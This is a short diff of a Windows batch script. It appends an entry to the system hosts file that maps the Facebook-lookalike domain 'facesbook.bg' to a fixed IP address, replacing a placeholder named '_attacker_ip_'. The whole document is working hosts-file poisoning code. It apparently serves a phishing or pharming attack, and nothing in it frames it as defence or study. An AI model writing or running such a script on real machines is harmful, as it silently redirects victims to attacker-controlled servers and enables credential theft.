@@ -2,5 +2,5 @@
 
 set hostspath=%windir%\System32\drivers\etc\hosts
 
-echo _attacker_ip_           facesbook.bg >> %hostspath%
+echo 192.168.1.2           facesbook.bg >> %hostspath%
 exit
